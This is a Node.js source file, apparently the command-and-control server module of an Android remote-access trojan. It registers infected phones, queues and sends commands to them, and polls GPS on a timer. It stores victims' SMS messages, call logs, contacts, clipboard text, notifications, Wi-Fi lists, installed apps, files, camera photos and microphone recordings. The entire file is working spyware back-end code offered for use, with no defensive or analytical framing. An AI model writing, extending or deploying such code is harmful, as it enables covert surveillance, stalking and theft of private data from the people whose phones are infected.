const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const db = require('./db');

class ClientManager {
    constructor() {
        this.sockets = {};
        this.dbs = {};
        this.gpsTimers = {};
    }

    // Connection handling
    connect(socket, id, data) {
        this.sockets[id] = socket;
        
        const client = db.main.get('clients').find({ id });
        const now = new Date().toISOString();
        
        if (client.value()) {
            client.assign({ lastSeen: now, online: true, ...data }).write();
        } else {
            db.main.get('clients').push({ id, firstSeen: now, lastSeen: now, online: true, ...data }).write();
        }
        
        this.setupHandlers(id);
        this.runQueue(id);
        console.log(`✓ ${id} connected`);
    }

    disconnect(id) {
        db.main.get('clients').find({ id }).assign({ online: false, lastSeen: new Date().toISOString() }).write();
        delete this.sockets[id];
        this.clearGps(id);
        console.log(`✗ ${id} disconnected`);
    }

    getDb(id) {
        if (!this.dbs[id]) this.dbs[id] = db.client(id);
        return this.dbs[id];
    }

    // Lists
    online() { return db.main.get('clients').filter({ online: true }).value(); }
    offline() { return db.main.get('clients').filter({ online: false }).value(); }

    // Commands
    send(id, cmd, params = {}, cb = () => {}) {
        const client = db.main.get('clients').find({ id }).value();
        if (!client) return cb('Client not found');
        
        params.type = cmd;
        
        if (this.sockets[id]) {
            this.sockets[id].emit('order', params);
            console.log(`→ ${cmd} to ${id}`);
            cb(null, 'Sent');
        } else {
            this.queue(id, params, cb);
        }
    }

    queue(id, params, cb) {
        const cdb = this.getDb(id);
        const existing = cdb.get('queue').find({ type: params.type }).value();
        if (existing) return cb('Already queued');
        
        params.uid = Date.now();
        cdb.get('queue').push(params).write();
        cb(null, 'Queued');
    }

    runQueue(id) {
        const cdb = this.getDb(id);
        const queue = cdb.get('queue').value();
        
        queue.forEach(cmd => {
            if (this.sockets[id]) {
                this.sockets[id].emit('order', cmd);
                cdb.get('queue').remove({ uid: cmd.uid }).write();
            }
        });
    }

    // GPS polling
    setGps(id, interval) {
        this.clearGps(id);
        if (interval > 0 && this.sockets[id]) {
            this.gpsTimers[id] = setInterval(() => {
                this.send(id, config.msg.location, {});
            }, interval * 1000);
            this.getDb(id).set('gpsInterval', interval).write();
        }
    }

    clearGps(id) {
        if (this.gpsTimers[id]) {
            clearInterval(this.gpsTimers[id]);
            delete this.gpsTimers[id];
        }
    }

    // Data for pages
    getData(id, page) {
        const cdb = this.getDb(id);
        const client = db.main.get('clients').find({ id }).value();
        if (!client) return null;
        
        const pages = {
            info: () => ({ client }),
            sms: () => ({ list: cdb.get('sms').value() }),
            calls: () => ({ list: cdb.get('calls').value() }),
            contacts: () => ({ list: cdb.get('contacts').value() }),
            wifi: () => ({ list: cdb.get('wifi').value() }),
            clipboard: () => ({ list: cdb.get('clipboard').value() }),
            notifications: () => ({ list: cdb.get('notifications').value() }),
            permissions: () => ({ list: cdb.get('permissions').value() }),
            apps: () => ({ list: cdb.get('apps').value() }),
            gps: () => ({ list: cdb.get('gps').value(), interval: cdb.get('gpsInterval').value() }),
            files: () => ({ list: cdb.get('files').value() }),
            downloads: () => ({ list: cdb.get('downloads').value() }),
            camera: () => ({ cameras: cdb.get('cameras').value(), photos: cdb.get('photos').value() }),
            mic: () => ({})
        };
        
        return pages[page] ? pages[page]() : null;
    }

    // Socket event handlers
    setupHandlers(id) {
        const socket = this.sockets[id];
        const cdb = this.getDb(id);
        
        socket.on('disconnect', () => this.disconnect(id));
        socket.on('pong', () => {});
        
        // SMS
        socket.on(config.msg.sms, data => {
            if (data.smslist) cdb.set('sms', data.smslist).write();
        });
        
        // Calls
        socket.on(config.msg.calls, data => {
            if (data.callsList) cdb.set('calls', data.callsList).write();
        });
        
        // Contacts
        socket.on(config.msg.contacts, data => {
            if (data.contactsList) cdb.set('contacts', data.contactsList).write();
        });
        
        // WiFi
        socket.on(config.msg.wifi, data => {
            console.log(`[WIFI] Received data for ${id}:`, data.networks ? data.networks.length + ' networks' : data);
            if (data.networks) cdb.set('wifi', data.networks).write();
        });
        
        // Clipboard
        socket.on(config.msg.clipboard, data => {
            if (data.text) {
                cdb.get('clipboard').push({ text: data.text, time: new Date().toISOString() }).write();
            }
        });
        
        // Notifications
        socket.on(config.msg.notification, data => {
            cdb.get('notifications').push({ ...data, time: new Date().toISOString() }).write();
        });
        
        // Permissions
        socket.on(config.msg.permissions, data => {
            if (data.permissions) cdb.set('permissions', data.permissions).write();
        });
        
        // Apps
        socket.on(config.msg.apps, data => {
            if (data.apps) cdb.set('apps', data.apps).write();
        });
        
        // Location
        socket.on(config.msg.location, data => {
            if (data.latitude) {
                cdb.get('gps').push({ ...data, time: new Date().toISOString() }).write();
            }
        });
        
        // Files
        socket.on(config.msg.files, data => this.handleFiles(id, data));
        
        // Camera
        socket.on(config.msg.camera, data => this.handleCamera(id, data));
        
        // Mic
        socket.on(config.msg.mic, data => this.handleMic(id, data));
    }

    handleFiles(id, data) {
        const cdb = this.getDb(id);
        
        if (data.type === 'list') {
            cdb.set('files', data.list || []).write();
        } else if (data.type === 'download' && data.buffer) {
            this.saveFile(id, data.name, data.buffer, 'downloads');
        } else if (data.type === 'download_start') {
            if (!this.transfers) this.transfers = {};
            this.transfers[data.transferId] = { name: data.name, chunks: [], total: data.totalChunks };
        } else if (data.type === 'download_chunk') {
            const t = this.transfers?.[data.transferId];
            if (t) t.chunks[data.chunkIndex] = data.chunkData;
        } else if (data.type === 'download_end') {
            const t = this.transfers?.[data.transferId];
            if (t) {
                this.saveFile(id, t.name, t.chunks.join(''), 'downloads');
                delete this.transfers[data.transferId];
            }
        }
    }

    handleCamera(id, data) {
        const cdb = this.getDb(id);
        
        if (data.camList) {
            console.log(`[CAMERA] Received camera list for ${id}:`, data.list);
            cdb.set('cameras', data.list || []).write();
        } else if (data.image && data.buffer) {
            console.log(`[CAMERA] Received photo from camera ${data.cameraId} for ${id}`);
            this.saveFile(id, `cam${data.cameraId}_${Date.now()}.jpg`, data.buffer, 'photos');
        }
    }

    handleMic(id, data) {
        if (data.file && data.buffer) {
            this.saveFile(id, data.name || `mic_${Date.now()}.mp4`, data.buffer, 'downloads');
        }
    }

    saveFile(id, name, buffer, type) {
        const dir = type === 'photos' ? config.photosPath : config.downloadsPath;
        const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
        const ext = path.extname(name) || '.bin';
        const filename = `${hash}${ext}`;
        const filepath = path.join(dir, filename);
        
        try {
            const data = typeof buffer === 'string' ? Buffer.from(buffer, 'base64') : buffer;
            fs.writeFileSync(filepath, data);
            
            const cdb = this.getDb(id);
            const entry = { name, file: `/${type === 'photos' ? 'photos' : 'downloads'}/${filename}`, time: new Date().toISOString() };
            
            if (type === 'photos') cdb.get('photos').push(entry).write();
            else cdb.get('downloads').push(entry).write();
            
            console.log(`✓ Saved ${name} for ${id}`);
        } catch (e) {
            console.error(`✗ Save failed: ${e.message}`);
        }
    }
}

module.exports = new ClientManager();
